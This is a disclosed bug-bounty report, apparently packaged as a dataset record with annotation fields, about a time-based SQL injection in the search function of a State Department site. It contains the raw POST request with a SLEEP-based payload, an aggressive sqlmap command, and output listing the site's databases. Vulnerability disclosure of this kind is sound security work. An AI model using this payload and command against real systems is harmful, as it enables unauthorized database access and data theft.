{
    "reported_to": "U.S. Department of State",
    "reported_by": "shadow-krd ",
    "title": "Time Based SQL Injection",
    "content": "\nHello and greetings and respect to you, dear friends\nWe all know that the sql injection bug is very dangerous, so this bug should be eliminated as soon as possible.\nI've identified an SQL injection vulnerability of type Time Based on https://diplomaticrooms.state.gov this site use wordpress cms but its not plugin sql injection\nBelow, we see how we found this vulnerability\nIf you look carefully, we see that search in the website name Search results The gap has occurred there\nas you can see POST Method [POST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt ]\nnow it's time to inject or generate POC with lovely tool sqlmap\nWe used a text file here by Name request.txt\nand this is our command in sqlmap you can use this command for your own confidence\npython3 sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs\nPOST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt HTTP/1.1\nHost: diplomaticrooms.state.gov\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0\nPragma: no-cache\nCache-Control: no-cache\nContent-Type: application/x-www-form-urlencoded\nReferer: https://diplomaticrooms.state.gov/?s=porcelain,%20gilt\nContent-Length: 133\nCookie: AWSALB=Bcs9ZrXwIhoRbHdfPbZAnVhkYJt9OJslAaUUgh5cOw9FMhg/43C2umhc4fQe7PtAorAHMSdr2dNw0asilWMYXjaFigXJhQJ2lxs05WQbpeI/cYRSGXLyo4E+hiQ1; AWSALBCORS=Bcs9ZrXwIhoRbHdfPbZAnVhkYJt9OJslAaUUgh5cOw9FMhg/43C2umhc4fQe7PtAorAHMSdr2dNw0asilWMYXjaFigXJhQJ2lxs05WQbpeI/cYRSGXLyo4E+hiQ1\nConnection: Close\nsearch=porcelain%2C+gilt%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29Xeps%29+AND+%27HlBp%27%3D%27HlBp&post_types%5B%5D=post\npython3 sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs\n\nH\n_ _[\"]_ _ _ {1.7.1.5#dev}\n|_ -| . [\"] | .'| . |\n|| [']||_|,| |\n||V... |_| https://sqlmap.org\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n[*] starting @ 12:21:06 /2023-02-17/\n[12:21:06][INFO] parsing HTTP request from 'request'\n[12:21:06][INFO] loading tamper module 'space2comment'\n[12:21:06][INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9b5) Gecko/2008041514 Firefox/3.0b5' from file '/home/ubuntu/sqlmap/data/txt/user-agents.txt'\ncustom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y\n[12:21:06][INFO] resuming back-end DBMS 'mysql'\n[12:21:06][INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\nParameter: #1* ((custom) POST)\nType: boolean-based blind\nTitle: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\nPayload: search=porcelain, gilt' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp&post_types[]=post\n[12:21:07][WARNING] changes made by tampering scripts are not included in shown payload content(s)\n[12:21:07][INFO] the back-end DBMS is MySQL\nweb application technology: Apache, PHP 7.4.16\nback-end DBMS: MySQL 5 (MariaDB fork)\n[12:21:07][INFO] fetching database names\n[12:21:07][INFO] fetching number of databases\n[12:21:14][WARNING] reflective value(s) found and filtering out\n[12:21:14][INFO] resumed: 6\n[12:21:14][INFO] retrieving the length of query output\n[12:21:14][INFO] retrieved: 18\n[12:22:32][INFO] retrieved: information_schema\n[12:22:32][INFO] retrieving the length of query output\n[12:22:32][INFO] retrieved: 5\n[12:23:01][INFO] retrieved: mysql\n[12:23:01][INFO] retrieving the length of query output\n[12:23:01][INFO] retrieved: 3\n[12:23:39][INFO] retrieved: tmp\n[12:23:39][INFO] retrieving the length of query output\n[12:23:39][INFO] retrieved: 6\n[12:24:16][INFO] retrieved: innodb\n[12:24:16][INFO] retrieving the length of query output\n[12:24:16][INFO] retrieved: 18\n[12:25:33][INFO] retrieved: performance_schema\n[12:25:33][INFO] retrieving the length of query output\n[12:25:33][INFO] retrieved: 8\n[12:26:15][INFO] retrieved: pantheon\navailable databases [6]:\n[*] information_schema\n[*] innodb\n[*] mysql\n[*] pantheon\n[*] performance_schema\n[*] tmp\nNotice:\nI didn't extracted any data from the database, but just for generate POC\nImpact\nthe hackers can be dump all information like all database tables then after that login to the website\navailable databases [6]:\n[*] information_schema\n[*] innodb\n[*] mysql\n[*] pantheon\n[*] performance_schema\n[*] tmp\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "SQL Injection"
    ],
    "screenshots": {},
    "disclosed_date": 1682027760,
    "report_url": "https://hackerone.com/reports/1878584",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Identify the search functionality on the target website (https://diplomaticrooms.state.gov) that uses a POST request with a search parameter."
        ],
        [
            2,
            "Use sqlmap with a crafted request file (request.txt) containing the POST request to test for time-based SQL injection vulnerabilities."
        ]
    ],
    "vuln_description": "The vulnerability is a time-based SQL injection in the search functionality of the WordPress CMS on https://diplomaticrooms.state.gov. This allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access to the database.",
    "reason": "The attack involves a straightforward use of sqlmap with a pre-crafted request file. The vulnerability is a common type (time-based SQL injection) and does not require complex interactions or state manipulation.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "authnz_metadata": {
        "reason": "The SQL injection vulnerability involves manipulating the search parameter to induce time delays, which is a specific type of injection that doesn't directly involve authentication or authorization boundaries. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are different from time-based SQL injection. Therefore, this specific vulnerability would not be detected by the described methodologies.",
        "is_detectable": false
    }
}